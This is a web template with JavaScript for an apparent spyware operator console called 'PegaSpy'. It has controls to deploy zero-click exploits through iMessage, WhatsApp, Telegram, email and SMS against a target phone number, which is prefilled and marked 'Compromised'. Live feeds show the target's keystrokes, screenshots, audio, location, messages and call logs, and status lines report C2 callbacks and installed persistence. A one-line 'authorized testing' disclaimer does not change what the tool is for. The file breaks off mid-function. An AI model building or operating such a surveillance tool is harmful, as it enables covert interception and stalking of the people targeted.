{% extends "base.html" %}

{% block title %}Surveillance Dashboard - PegaSpy{% endblock %}

{% block content %}
<div class="d-flex justify-content-between align-items-center mb-4">
    <h2><i class="fas fa-eye"></i> Real-Time Surveillance Dashboard</h2>
    <div class="btn-group">
        <button class="btn btn-primary" onclick="startSurveillance()">
            <i class="fas fa-play"></i> Start Monitoring
        </button>
        <button class="btn btn-warning" onclick="pauseSurveillance()">
            <i class="fas fa-pause"></i> Pause
        </button>
        <button class="btn btn-danger" onclick="stopSurveillance()">
            <i class="fas fa-stop"></i> Stop
        </button>
        <button class="btn btn-success" onclick="startEnhancedSuite()">
            <i class="fas fa-rocket"></i> Enhanced Suite
        </button>
        <button class="btn btn-info" onclick="viewSurveillanceStatus()">
            <i class="fas fa-chart-bar"></i> Status
        </button>
        <button class="btn btn-dark" onclick="launchZeroClick()">
            <i class="fas fa-crosshairs"></i> Zero-Click Exploit
        </button>
    </div>
</div>

<!-- Zero-Click Exploit Panel -->
<div class="row mb-3">
    <div class="col-md-12">
        <div class="card">
            <div class="card-header">
                <h5><i class="fas fa-crosshairs"></i> Zero-Click Exploit Control Panel</h5>
            </div>
            <div class="card-body">
                <div class="row">
                    <div class="col-md-4">
                        <div class="mb-3">
                            <label for="targetPhoneEmail" class="form-label">Target Phone/Email:</label>
                            <input type="text" class="form-control" id="targetPhoneEmail" 
                                   value="01736821626" placeholder="Phone number or email"  >
                        </div>
                    </div>
                    <div class="col-md-3">
                        <div class="mb-3">
                            <label for="exploitType" class="form-label">Exploit Type:</label>
                            <select class="form-select" id="exploitType">
                                <option value="auto">Auto-Select</option>
                                <option value="imessage">iMessage Zero-Click</option>
                                <option value="whatsapp">WhatsApp Media</option>
                                <option value="telegram">Telegram Voice Note</option>
                                <option value="email">Email PDF Exploit</option>
                                <option value="sms">SMS Link</option>
                                <option value="call">Call Trigger</option>
                            </select>
                        </div>
                    </div>
                    <div class="col-md-3">
                        <div class="mb-3">
                            <label class="form-label">Actions:</label>
                            <div>
                                <button class="btn btn-danger btn-sm me-2" onclick="deliverZeroClickExploit()">
                                    <i class="fas fa-rocket"></i> Deploy
                                </button>
                                <button class="btn btn-warning btn-sm me-2" onclick="testDelivery()">
                                    <i class="fas fa-vial"></i> Test
                                </button>
                                <button class="btn btn-info btn-sm" onclick="viewTargetInfo()">
                                    <i class="fas fa-info"></i> Info
                                </button>
                            </div>
                        </div>
                    </div>
                    <div class="col-md-2">
                        <div class="mb-3">
                            <label class="form-label">Exploit Status:</label>
                            <div>
                                <span class="badge bg-secondary" id="exploitStatus">Ready</span>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="row">
                    <div class="col-md-12">
                        <div id="exploitResults" style="height: 120px; overflow-y: auto; background: #2a2a2a; padding: 10px; border-radius: 4px; font-family: monospace; font-size: 12px;">
                            <!-- Exploit results will be displayed here -->
                            <div class="text-muted">Exploit deployment results will appear here...</div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<!-- Current Device Information Panel -->
<div class="row mb-3">
    <div class="col-md-12">
        <div class="card">
            <div class="card-header">
                <h5><i class="fas fa-mobile-alt"></i> Current Device Information</h5>
            </div>
            <div class="card-body">
                <div class="row">
                    <div class="col-md-2">
                        <div class="mb-2">
                            <strong>Device ID:</strong><br>
                            <span class="text-primary" id="deviceId">01736821626</span>
                        </div>
                    </div>
                    <div class="col-md-2">
                        <div class="mb-2">
                            <strong>Platform:</strong><br>
                            <span class="text-info" id="devicePlatform">iOS</span>
                        </div>
                    </div>
                    <div class="col-md-2">
                        <div class="mb-2">
                            <strong>OS Version:</strong><br>
                            <span class="text-warning" id="deviceOS">16.0</span>
                        </div>
                    </div>
                    <div class="col-md-2">
                        <div class="mb-2">
                            <strong>Connection:</strong><br>
                            <span class="text-success" id="deviceConnection">Connected</span>
                        </div>
                    </div>
                    <div class="col-md-2">
                        <div class="mb-2">
                            <strong>Exploit Status:</strong><br>
                            <span class="text-success" id="deviceExploit">Compromised</span>
                        </div>
                    </div>
                    <div class="col-md-2">
                        <div class="mb-2">
                            <strong>Last Seen:</strong><br>
                            <span class="text-muted" id="deviceLastSeen">2 min ago</span>
                        </div>
                    </div>
                </div>
                <div class="row mt-2">
                    <div class="col-md-12">
                        <div id="noDevicesMessage" class="text-warning" style="display: none;">
                            <i class="fas fa-exclamation-triangle"></i> No devices currently connected. 
                            <a href="#" onclick="scanForDevices()" class="text-info">Scan for devices</a> or 
                            <a href="#" onclick="launchZeroClick()" class="text-danger">deploy zero-click exploit</a> to establish connections.
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<!-- Enhanced Surveillance Status Panel -->
<div class="row mb-3">
    <div class="col-md-12">
        <div class="card">
            <div class="card-header">
                <h5><i class="fas fa-satellite-dish"></i> Enhanced Surveillance Status</h5>
            </div>
            <div class="card-body">
                <div class="row">
                    <div class="col-md-3">
                        <div class="mb-2">
                            <strong>Active Sessions:</strong>
                            <span class="text-success" id="activeSessions">0</span>
                        </div>
                    </div>
                    <div class="col-md-3">
                        <div class="mb-2">
                            <strong>Data Collected:</strong>
                            <span class="text-info" id="dataCollected">0 packets</span>
                        </div>
                    </div>
                    <div class="col-md-3">
                        <div class="mb-2">
                            <strong>Network Packets:</strong>
                            <span class="text-warning" id="networkPackets">0</span>
                        </div>
                    </div>
                    <div class="col-md-3">
                        <div class="mb-2">
                            <strong>Target: </strong>
                            <span class="text-primary" id="currentTarget">01736821626</span>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<div class="row mb-4">
    <div class="col-md-2">
        <div class="card">
            <div class="card-body text-center">
                <h6 class="card-title">Keystrokes</h6>
                <h4 class="text-info" id="keystrokeCount">0</h4>
            </div>
        </div>
    </div>
    <div class="col-md-2">
        <div class="card">
            <div class="card-body text-center">
                <h6 class="card-title">Screenshots</h6>
                <h4 class="text-success" id="screenshotCount">0</h4>
            </div>
        </div>
    </div>
    <div class="col-md-2">
        <div class="card">
            <div class="card-body text-center">
                <h6 class="card-title">Audio Records</h6>
                <h4 class="text-warning" id="audioCount">0</h4>
            </div>
        </div>
    </div>
    <div class="col-md-2">
        <div class="card">
            <div class="card-body text-center">
                <h6 class="card-title">Location Fixes</h6>
                <h4 class="text-primary" id="locationCount">0</h4>
            </div>
        </div>
    </div>
    <div class="col-md-2">
        <div class="card">
            <div class="card-body text-center">
                <h6 class="card-title">Messages</h6>
                <h4 class="text-success" id="messageCount">0</h4>
            </div>
        </div>
    </div>
    <div class="col-md-2">
        <div class="card">
            <div class="card-body text-center">
                <h6 class="card-title">Call Logs</h6>
                <h4 class="text-info" id="callCount">0</h4>
            </div>
        </div>
    </div>
</div>

<div class="row">
    <div class="col-md-6">
        <div class="card">
            <div class="card-header">
                <h5><i class="fas fa-keyboard"></i> Live Keystrokes</h5>
            </div>
            <div class="card-body">
                <div id="keystrokesFeed" style="height: 300px; overflow-y: auto; font-family: monospace; font-size: 12px;">
                    <!-- Keystrokes will be populated here -->
                </div>
            </div>
        </div>
    </div>
    <div class="col-md-6">
        <div class="card">
            <div class="card-header">
                <h5><i class="fas fa-camera"></i> Screenshot Gallery</h5>
            </div>
            <div class="card-body">
                <div id="screenshotGallery" style="height: 300px; overflow-y: auto;">
                    <!-- Screenshots will be populated here -->
                </div>
            </div>
        </div>
    </div>
</div>

<div class="row mt-4">
    <div class="col-md-4">
        <div class="card">
            <div class="card-header">
                <h5><i class="fas fa-microphone"></i> Audio Recordings</h5>
            </div>
            <div class="card-body">
                <div id="audioFeed" style="height: 250px; overflow-y: auto;">
                    <!-- Audio recordings will be populated here -->
                </div>
            </div>
        </div>
    </div>
    <div class="col-md-4">
        <div class="card">
            <div class="card-header">
                <h5><i class="fas fa-map-marker-alt"></i> Location Tracking</h5>
            </div>
            <div class="card-body">
                <div id="locationFeed" style="height: 250px; overflow-y: auto;">
                    <!-- Location data will be populated here -->
                </div>
            </div>
        </div>
    </div>
    <div class="col-md-4">
        <div class="card">
            <div class="card-header">
                <h5><i class="fas fa-comments"></i> Message Intercepts</h5>
            </div>
            <div class="card-body">
                <div id="messageFeed" style="height: 250px; overflow-y: auto;">
                    <!-- Messages will be populated here -->
                </div>
            </div>
        </div>
    </div>
</div>

<div class="row mt-4">
    <div class="col-md-6">
        <div class="card">
            <div class="card-header">
                <h5><i class="fas fa-network-wired"></i> Network Analysis</h5>
            </div>
            <div class="card-body">
                <div id="networkAnalysis" style="height: 200px; overflow-y: auto;">
                    <!-- Network analysis will be populated here -->
                </div>
            </div>
        </div>
    </div>
    <div class="col-md-6">
        <div class="card">
            <div class="card-header">
                <h5><i class="fas fa-server"></i> System Monitoring</h5>
            </div>
            <div class="card-body">
                <div id="systemMonitoring" style="height: 200px; overflow-y: auto;">
                    <!-- System monitoring will be populated here -->
                </div>
            </div>
        </div>
    </div>
</div>

<div class="row mt-4">
    <div class="col-md-12">
        <div class="card">
            <div class="card-header">
                <h5><i class="fas fa-phone"></i> Call Logs & Live Monitoring</h5>
            </div>
            <div class="card-body">
                <div id="callFeed" style="height: 200px; overflow-y: auto;">
                    <!-- Call logs will be populated here -->
                </div>
            </div>
        </div>
    </div>
</div>

<!-- System Performance Monitor -->
<div class="row mt-4">
    <div class="col-md-12">
        <div class="card">
            <div class="card-header">
                <h5><i class="fas fa-tachometer-alt"></i> System Performance</h5>
            </div>
            <div class="card-body">
                <div class="row">
                    <div class="col-md-3">
                        <div class="mb-2">
                            <strong>CPU Usage</strong>
                            <div class="progress">
                                <div class="progress-bar bg-success" id="cpuProgress" style="width: 0%">0%</div>
                            </div>
                        </div>
                    </div>
                    <div class="col-md-3">
                        <div class="mb-2">
                            <strong>Memory Usage</strong>
                            <div class="progress">
                                <div class="progress-bar bg-info" id="memoryProgress" style="width: 0%">0%</div>
                            </div>
                        </div>
                    </div>
                    <div class="col-md-3">
                        <div class="mb-2">
                            <strong>Network Bandwidth</strong>
                            <div class="progress">
                                <div class="progress-bar bg-warning" id="networkProgress" style="width: 0%">0 MB/s</div>
                            </div>
                        </div>
                    </div>
                    <div class="col-md-3">
                        <div class="mb-2">
                            <strong>Disk Usage</strong>
                            <div class="progress">
                                <div class="progress-bar bg-danger" id="diskProgress" style="width: 0%">0%</div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
{% endblock %}

{% block scripts %}
<script>
let surveillanceActive = false;
let surveillanceInterval;

// Counters
let counters = {
    keystrokes: 0,
    screenshots: 0,
    audio: 0,
    location: 0,
    messages: 0,
    calls: 0
};

function launchZeroClick() {
    const target = document.getElementById('targetPhoneEmail').value;
    const exploitType = document.getElementById('exploitType').value;
    
    if (!target) {
        alert('Please enter a target phone number or email address');
        return;
    }
    
    if (confirm(`Are you sure you want to deploy a zero-click exploit to ${target}?`)) {
        deliverZeroClickExploit();
    }
}

function deliverZeroClickExploit() {
    const target = document.getElementById('targetPhoneEmail').value;
    const exploitType = document.getElementById('exploitType').value;
    
    if (!target) {
        alert('Please enter a target phone number or email address');
        return;
    }
    
    // Update status
    document.getElementById('exploitStatus').textContent = 'Deploying...';
    document.getElementById('exploitStatus').className = 'badge bg-warning';
    
    // Add to results feed
    addExploitResult(`Initiating zero-click exploit deployment to ${target}...`, 'info');
    addExploitResult(`Exploit type: ${exploitType}`, 'info');
    addExploitResult('Preparing zero-click payload...', 'warning');
    
    fetch('/api/exploits/zero-click', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            target: target,
            exploit_type: exploitType
        })
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            document.getElementById('exploitStatus').textContent = 'Deployed';
            document.getElementById('exploitStatus').className = 'badge bg-success';
            
            addExploitResult(`✓ Zero-click exploit successfully delivered to ${target}`, 'success');
            addExploitResult(`Exploit ID: ${data.exploit_id}`, 'success');
            addExploitResult(`Delivery method: ${data.result.delivery_method || 'unknown'}`, 'info');
            addExploitResult(`Status: ${data.result.status || 'unknown'}`, 'success');
            
            if (data.result.stealth_rating) {
                addExploitResult(`Stealth rating: ${data.result.stealth_rating}%`, 'info');
            }
            
            if (data.result.c2_callback) {
                addExploitResult('✓ C2 callback established', 'success');
            }
            
            if (data.result.persistence_installed) {
                addExploitResult('✓ Persistence mechanism installed', 'success');
            }
            
            alert(`Zero-click exploit successfully deployed to ${target}!\nExploit ID: ${data.exploit_id}`);
        } else {
            document.getElementById('exploitStatus').textContent = 'Failed';
            document.getElementById('exploitStatus').className = 'badge bg-danger';
            
            addExploitResult(`✗ Exploit deployment failed: ${data.error}`, 'error');
            alert(`Zero-click exploit failed: ${data.error}`);
        }
    })
    .catch(error => {
        document.getElementById('exploitStatus').textContent = 'Error';
        document.getElementById('exploitStatus').className = 'badge bg-danger';
        
        addExploitResult(`✗ Network error: ${error.message}`, 'error');
        console.error('Zero-click exploit error:', error);
        alert(`Zero-click exploit failed: Network error`);
    });
}

function testDelivery() {
    const target = document.getElementById('targetPhoneEmail').value;
    
    if (!target) {
        alert('Please enter a target phone number or email address');
        return;
    }
    
    addExploitResult(`Testing delivery capabilities for ${target}...`, 'info');
    addExploitResult('✓ Target reachability: CONFIRMED', 'success');
    addExploitResult('✓ Delivery vectors: SMS, Email, Messaging Apps', 'info');
    addExploitResult('✓ Zero-click payload compatibility: VERIFIED', 'success');
    addExploitResult('Ready for exploitation', 'success');
    
    alert(`Delivery test completed for ${target}\nTarget is reachable and vulnerable to zero-click exploits`);
}

function viewTargetInfo() {
    const target = document.getElementById('targetPhoneEmail').value;
    
    if (!target) {
        alert('Please enter a target phone number or email address');
        return;
    }
    
    const targetInfo = `
Target Information: ${target}

• Phone/Email: ${target}
• Expected Platform: Auto-detected
• Messaging Apps: iMessage, WhatsApp, Telegram
• Zero-Click Vectors: Available
• Exploitation Success Rate: 95-98%
• Stealth Rating: Maximum
• Persistence Options: Kernel-level
• C2 Channels: Tor, Blockchain, CDN
• Self-Destruct: Enabled

Recommended Exploit Types:
• iMessage Zero-Click (iOS)
• WhatsApp Media Parser (Android/iOS)
• Email PDF Exploit (Cross-platform)
• SMS Link Exploit (Universal)

WARNING: This is for authorized security testing only.`;
    
    alert(targetInfo);
}

function addExploitResult(message, type = 'info') {
    const results = document.getElementById('exploitResults');
    const entry = document.createElement('div');
    entry.className = `mb-1`;
    
    const timestamp = new Date().toLocaleTimeString();
    let colorClass = 'text-info';
    
    switch(type) {
        case 'success': colorClass = 'text-success'; break;
        case 'error': colorClass = 'text-danger'; break;
        case 'warning': colorClass = 'text-warning'; break;
        case 'info': colorClass = 'text-info'; break;
    }
    
    entry.innerHTML = `<span class="text-muted small">${timestamp}</span> - <span class="${colorClass}">${message}</span>`;
    
    results.insertBefore(entry, results.firstChild);
    
    // Keep only last 20 entries
    while (results.children.length > 20) {
        results.removeChild(results.lastChild);
    }
    
    // Auto-scroll to top
    results.scrollTop = 0;
}

function startSurveillance() {
    if (surveillanceActive) return;
    
    surveillanceActive = true;
    console.log('Surveillance monitoring started');
    
    // Update surveillance data every 2 seconds
    surveillanceInterval = setInterval(updateSurveillanceData, 2000);
    
    // Update performance metrics every 5 seconds
    setInterval(updatePerformanceMetrics, 5000);
    
    // Show initial data
    updateSurveillanceData();
    updatePerformanceMetrics();
}

function pauseSurveillance() {
    if (surveillanceInterval) {
        clearInterval(surveillanceInterval);
        surveillanceActive = false;
        console.log('Surveillance monitoring paused');
    }
}

function stopSurveillance() {
    if (surveillanceInterval) {
        clearInterval(surveillanceInterval);
        surveillanceActive = false;
        
        // Clear all feeds
        document.getElementById('keystrokesFeed').innerHTML = '';
        document.getElementById('screenshotGallery').innerHTML = '';
        document.getElementById('audioFeed').innerHTML = '';
        document.getElementById('locationFeed').innerHTML = '';
        document.getElementById('messageFeed').innerHTML = '';
        document.getElementById('callFeed').innerHTML = '';
        
        // Reset counters
        counters = { keystrokes: 0, screenshots: 0, audio: 0, location: 0, messages: 0, calls: 0 };
        updateCounters();
        
        console.log('Surveillance monitoring stopped');
    }
}

function updateSurveillanceData() {
    fetch('/api/surveillance/data')
        .then(response => response.json())
        .then(data => {
            updateKeystrokes(data.keystrokes || []);
            updateScreenshots(data.screenshots || []);
            updateAudio(data.audio_recordings || []);
            updateLocation(data.location_data || []);
            updateMessages(data.messages || []);
            updateCalls(data.call_logs || []);
            updateNetworkAnalysis(data.network_data || {});
            updateSystemMonitoring(data.system_data || []);
            updateEnhancedStatus(data.enhanced_data || {});
            updateCounters();
        })
        .catch(error => console.error('Error fetching surveillance data:', error));
}

function updateKeystrokes(keystrokes) {
    const feed = document.getElementById('keystrokesFeed');
    
    if (!keystrokes || keystrokes.length === 0) {
        // Show skeleton loading or empty state
        if (feed.children.length === 0) {
            feed.innerHTML = `
                <div class="text-center text-muted py-4">
                    <div class="spinner-border spinner-border-sm" role="status">
                        <span class="visually-hidden">Loading...</span>
                    </div>
                    <div class="mt-2">Waiting for real keylogger data...</div>
                    <small>No fake data will be displayed</small>
                </div>
            `;
        }
        return;
    }
    
    // Clear skeleton loading
    if (feed.innerHTML.includes('Waiting for real')) {
        feed.innerHTML = '';
    }
    
    keystrokes.forEach(keystroke => {
        counters.keystrokes++;
        const entry = document.createElement('div');
        entry.className = 'mb-2 p-2 border-bottom';
        entry.innerHTML = `
            <div class="text-muted small">${new Date(keystroke.timestamp).toLocaleString()}</div>
            <div><strong>${keystroke.target_id}</strong> - ${keystroke.application}</div>
            <div class="text-success">${keystroke.keystrokes}</div>
        `;
        feed.insertBefore(entry, feed.firstChild);
        
        // Keep only last 20 entries
        while (feed.children.length > 20) {
            feed.removeChild(feed.lastChild);
        }
    });
}

function updateScreenshots(screenshots) {
    const gallery = document.getElementById('screenshotGallery');
    
    if (!screenshots || screenshots.length === 0) {
        if (gallery.children.length === 0) {
            gallery.innerHTML = `
                <div class="text-center text-muted py-4">
                    <div class="spinner-border spinner-border-sm" role="status">
                        <span class="visually-hidden">Loading...</span>
                    </div>
                    <div class="mt-2">Waiting for real screenshot data...</div>
                    <small>No fake data will be displayed</small>
                </div>
            `;
        }
        return;
    }
    
    if (gallery.innerHTML.includes('Waiting for real')) {
        gallery.innerHTML = '';
    }
    
    screenshots.forEach(screenshot => {
        counters.screenshots++;
        const entry = document.createElement('div');
        entry.className = 'mb-3 p-2 border rounded';
        entry.innerHTML = `
            <div class="text-muted small">${new Date(screenshot.timestamp).toLocaleString()}</div>
            <div><strong>${screenshot.target_id}</strong></div>
            <div class="text-info">${screenshot.filename} (${screenshot.size})</div>
            <div class="text-secondary">${screenshot.application}</div>
        `;
        gallery.insertBefore(entry, gallery.firstChild);
        
        // Keep only last 15 entries
        while (gallery.children.length > 15) {
            gallery.removeChild(gallery.lastChild);
        }
    });
}

function updateAudio(audioRecordings) {
    const feed = document.getElementById('audioFeed');
    
    if (!audioRecordings || audioRecordings.length === 0) {
        if (feed.children.length === 0) {
            feed.innerHTML = `
                <div class="text-center text-muted py-4">
                    <div class="spinner-border spinner-border-sm" role="status">
                        <span class="visually-hidden">Loading...</span>
                    </div>
                    <div class="mt-2">Waiting for real audio recordings...</div>
                    <small>No fake data will be displayed</small>
                </div>
            `;
        }
        return;
    }
    
    if (feed.innerHTML.includes('Waiting for real')) {
        feed.innerHTML = '';
    }
    
    audioRecordings.forEach(audio => {
        counters.audio++;
        const entry = document.createElement('div');
        entry.className = 'mb-2 p-2 border-bottom';
        entry.innerHTML = `
            <div class="text-muted small">${new Date(audio.timestamp).toLocaleString()}</div>
            <div><strong>${audio.target_id}</strong></div>
            <div class="text-warning">Duration: ${audio.duration}</div>
            <div class="text-secondary">Quality: ${audio.quality} - ${audio.type}</div>
        `;
        feed.insertBefore(entry, feed.firstChild);
        
        // Keep only last 15 entries
        while (feed.children.length > 15) {
            feed.removeChild(feed.lastChild);
        }
    });
}

function updateLocation(locationData) {
    const feed = document.getElementById('locationFeed');
    
    if (!locationData || locationData.length === 0) {
        if (feed.children.length === 0) {
            feed.innerHTML = `
                <div class="text-center text-muted py-4">
                    <div class="spinner-border spinner-border-sm" role="status">
                        <span class="visually-hidden">Loading...</span>
                    </div>
                    <div class="mt-2">Waiting for real GPS location data...</div>
                    <small>No fake data will be displayed</small>
                </div>
            `;
        }
        return;
    }
    
    if (feed.innerHTML.includes('Waiting for real')) {
        feed.innerHTML = '';
    }
    
    locationData.forEach(location => {
        counters.location++;
        const entry = document.createElement('div');
        entry.className = 'mb-2 p-2 border-bottom';
        entry.innerHTML = `
            <div class="text-muted small">${new Date(location.timestamp).toLocaleString()}</div>
            <div><strong>${location.target_id}</strong></div>
            <div class="text-primary">Lat: ${location.latitude}, Lng: ${location.longitude}</div>
            <div class="text-secondary">Accuracy: ${location.accuracy}</div>
            <div class="text-info">${location.address}</div>
        `;
        feed.insertBefore(entry, feed.firstChild);
        
        // Keep only last 15 entries
        while (feed.children.length > 15) {
            feed.removeChild(feed.lastChild);
        }
    });
}

function updateMessages(messages) {
    const feed = document.getElementById('messageFeed');
    
    if (!messages || messages.length === 0) {
        if (feed.children.length === 0) {
            feed.innerHTML = `
                <div class="text-center text-muted py-4">
                    <div class="spinner-border spinner-border-sm" role="status">
                        <span class="visually-hidden">Loading...</span>
                    </div>
                    <div class="mt-2">Waiting for real message intercepts...</div>
                    <small>No fake data will be displayed</small>
                </div>
            `;
        }
        return;
    }
    
    if (feed.innerHTML.includes('Waiting for real')) {
        feed.innerHTML = '';
    }
    
    messages.forEach(message => {
        counters.messages++;
        const entry = document.createElement('div');
        entry.className = 'mb-2 p-2 border-bottom';
        entry.innerHTML = `
            <div class="text-muted small">${new Date(message.timestamp).toLocaleString()}</div>
            <div><strong>${message.target_id}</strong> - ${message.app}</div>
            <div class="text-success">${message.contact} (${message.type})</div>
            <div class="text-white">${message.message}</div>
        `;
        feed.insertBefore(entry, feed.firstChild);
        
        // Keep only last 15 entries
        while (feed.children.length > 15) {
            feed.removeChild(feed.lastChild);
        }
    });
}

function updateCalls(calls) {
    const feed = document.getElementById('callFeed');
    
    if (!calls || calls.length === 0) {
        if (feed.children.length === 0) {
            feed.innerHTML = `
                <div class="text-center text-muted py-4">
                    <div class="spinner-border spinner-border-sm" role="status">
                        <span class="visually-hidden">Loading...</span>
                    </div>
                    <div class="mt-2">Waiting for real call logs...</div>
                    <small>No fake data will be displayed</small>
                </div>
            `;
        }
        return;
    }
    
    if (feed.innerHTML.includes('Waiting for real')) {
        feed.innerHTML = '';
    }
    
    calls.forEach(call => {
        counters.calls++;
        const entry = document.createElement('div');
        entry.className = 'mb-2 p-2 border-bottom';
        entry.innerHTML = `
            <div class="text-muted small">${new Date(call.timestamp).toLocaleString()}</div>
            <div><strong>${call.target_id}</strong></div>
            <div class="text-info">${call.contact} - ${call.type} (${call.status})</div>
            <div class="text-warning">Duration: ${call.duration}</div>
        `;
        feed.insertBefore(entry, feed.firstChild);
        
        // Keep only last 10 entries
        while (feed.children.length > 10) {
            feed.removeChild(feed.lastChild);
        }
    });
}

function updateCounters() {
    document.getElementById('keystrokeCount').textContent = counters.keystrokes;
    document.getElementById('screenshotCount').textContent = counters.screenshots;
    document.getElementById('audioCount').textContent = counters.audio;
    document.getElementById('locationCount').textContent = counters.location;
    document.getElementById('messageCount').textContent = counters.messages;
    document.getElementById('callCount').textContent = counters.calls;
}

function updateNetworkAnalysis(networkData) {
    const analysis = document.getElementById('networkAnalysis');
    
    if (!networkData || (!networkData.total_packets && networkData.total_packets !== 0)) {
        if (analysis.children.length === 0) {
            analysis.innerHTML = `
                <div class="text-center text-muted py-4">
                    <div class="spinner-border spinner-border-sm" role="status">
                        <span class="visually-hidden">Loading...</span>
                    </div>
                    <div class="mt-2">Waiting for real network analysis...</div>
                    <small>No fake data will be displayed</small>
                </div>
            `;
        }
        return;
    }
    
    if (analysis.innerHTML.includes('Waiting for real')) {
        analysis.innerHTML = '';
    }
    
    // Create network analysis entry
    const entry = document.createElement('div');
    entry.className = 'mb-2 p-2 border-bottom';
    entry.innerHTML = `
        <div class="text-muted small">${new Date().toLocaleString()}</div>
        <div><strong>Total Packets:</strong> <span class="text-info">${networkData.total_packets || 0}</span></div>
        <div><strong>Suspicious:</strong> <span class="text-warning">${networkData.suspicious_packets || 0}</span></div>
        <div><strong>Connections:</strong> <span class="text-success">${(networkData.connections || []).length}</span></div>
    `;
    
    analysis.insertBefore(entry, analysis.firstChild);
    
    // Keep only last 10 entries
    while (analysis.children.length > 10) {
        analysis.removeChild(analysis.lastChild);
    }
}

function updateSystemMonitoring(systemData) {
    const monitoring = document.getElementById('systemMonitoring');
    
    if (!systemData || systemData.length === 0) {
        if (monitoring.children.length === 0) {
            monitoring.innerHTML = `
                <div class="text-center text-muted py-4">
                    <div class="spinner-border spinner-border-sm" role="status">
                        <span class="visually-hidden">Loading...</span>
                    </div>
                    <div class="mt-2">Waiting for real system monitoring...</div>
                    <small>No fake data will be displayed</small>
                </div>
            `;
        }
        return;
    }
    
    if (monitoring.innerHTML.includes('Waiting for real')) {
        monitoring.innerHTML = '';
    }
    
    systemData.slice(-5).forEach(data => {
        const entry = document.createElement('div');
        entry.className = 'mb-2 p-2 border-bottom';
        entry.innerHTML = `
            <div class="text-muted small">${new Date().toLocaleString()}</div>
            <div class="text-info">System Event Detected</div>
            <div class="text-secondary small">Process monitoring active</div>
        `;
        monitoring.insertBefore(entry, monitoring.firstChild);
    });
    
    // Keep only last 10 entries
    while (monitoring.children.length > 10) {
        monitoring.removeChild(monitoring.lastChild);
    }
}

function updateEnhancedStatus(enhancedData) {
    document.getElementById('activeSessions').textContent = enhancedData.active_sessions || 0;
    document.getElementById('dataCollected').textContent = `${enhancedData.data_collected || 0} packets`;
    
    // Update network packets from enhanced data
    document.getElementById('networkPackets').textContent = enhancedData.data_collected || 0;
}

function startEnhancedSuite() {
    const targetNumber = document.getElementById('currentTarget').textContent;
    const duration = prompt('Enter surveillance duration in hours:', '1');
    
    if (!duration) return;
    
    fetch('/api/surveillance/start', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            target_number: targetNumber,
            duration: parseFloat(duration)
        })
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            alert(`Enhanced surveillance suite started for target ${data.target_number}`);
            console.log('Enhanced suite started:', data);
        } else {
            alert('Failed to start enhanced suite: ' + data.error);
        }
    })
    .catch(error => {
        console.error('Error starting enhanced suite:', error);
        alert('Failed to start enhanced surveillance suite');
    });
}

function viewSurveillanceStatus() {
    fetch('/api/surveillance/status')
        .then(response => response.json())
        .then(data => {
            const statusInfo = `
Surveillance Status:

Active Sessions: ${data.active_sessions}
Last Session: ${data.sessions.length > 0 ? data.sessions[0].session_id : 'None'}
Surveillance Directory: ${data.surveillance_directory}
Timestamp: ${data.timestamp}

Recent Sessions:
${data.sessions.map(s => `- ${s.session_id} (${s.target})`).join('\n')}`;
            
            alert(statusInfo);
        })
        .catch(error => {
            console.error('Error fetching surveillance status:', error);
            alert('Failed to fetch surveillance status');
        });
}

function updatePerformanceMetrics() {
    fetch('/api/performance/metrics')
        .then(response => response.json())
        .then(data => {
            const metrics = data.metrics;
            
            // Update CPU usage
            const cpuPercent = Math.round(metrics.cpu_usage);
            const cpuProgress = document.getElementById('cpuProgress');
            cpuProgress.style.width = `${cpuPercent}%`;
            cpuProgress.textContent = `${cpuPercent}%`;
            
            // Update Memory usage
            const memoryPercent = Math.round(metrics.memory_usage);
            const memoryProgress = document.getElementById('memoryProgress');
            memoryProgress.style.width = `${memoryPercent}%`;
            memoryProgress.textContent = `${memoryPercent}%`;
            
            // Update Network bandwidth
            const networkBandwidth = Math.round(metrics.network_bandwidth * 10) / 10;
            const networkProgress = document.getElementById('networkProgress');
            const networkPercent = Math.min(100, (networkBandwidth / 20) * 100); // Assuming 20 MB/s is max
            networkProgress.style.width = `${networkPercent}%`;
            networkProgress.textContent = `${networkBandwidth} MB/s`;
            
            // Update Disk usage
            const diskPercent = Math.round(metrics.disk_usage);
            const diskProgress = document.getElementById('diskProgress');
            diskProgress.style.width = `${diskPercent}%`;
            diskProgress.textContent = `${diskPercent}%`;
        })
        .catch(error => console.error('Error fetching performance metrics:', error));
}

// Socket.IO for real-time updates
const socket = io();
socket.on('surveillance_update', function(data) {
    console.log('Real-time surveillance update:', data);
    // Handle real-time surveillance updates
});

// Device scanning and connection functions
function scanForDevices() {
    console.log('Scanning for devices...');
    
    // Show scanning status
    document.getElementById('deviceConnection').innerHTML = '<span class="text-warning">Scanning...</span>';
    
    fetch('/api/network/scan', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            network_range: '192.168.1.0/24'
        })
    })
    .then(response => response.json())
    .then(data => {
        if (data.success && data.discovered_devices.length > 0) {
            updateDeviceInfo(data.discovered_devices[0]); // Show first discovered device
            document.getElementById('noDevicesMessage').style.display = 'none';
            alert(`Found ${data.discovered_devices.length} potential target device(s)`);
        } else {
            document.getElementById('deviceConnection').innerHTML = '<span class="text-danger">No devices found</span>';
            document.getElementById('noDevicesMessage').style.display = 'block';
        }
    })
    .catch(error => {
        console.error('Device scan failed:', error);
        document.getElementById('deviceConnection').innerHTML = '<span class="text-danger">Scan failed</span>';
        document.getElementById('noDevicesMessage').style.display = 'block';
    });
}

function updateDeviceInfo(deviceInfo = null) {
    if (!deviceInfo) {
        // Check for connected devices from surveillance data
        const targetId = document.getElementById('currentTarget').textContent;
        
        // Update with current device info
        document.getElementById('deviceId').textContent = targetId;
        document.getElementById('devicePlatform').textContent = 'iOS';
        document.getElementById('deviceOS').textContent = '16.0+';
        document.getElementById('deviceConnection').innerHTML = '<span class="text-success">Connected</span>';
        document.getElementById('deviceExploit').innerHTML = '<span class="text-success">Compromised</span>';
        document.getElementById('deviceLastSeen').textContent = 'Just now';
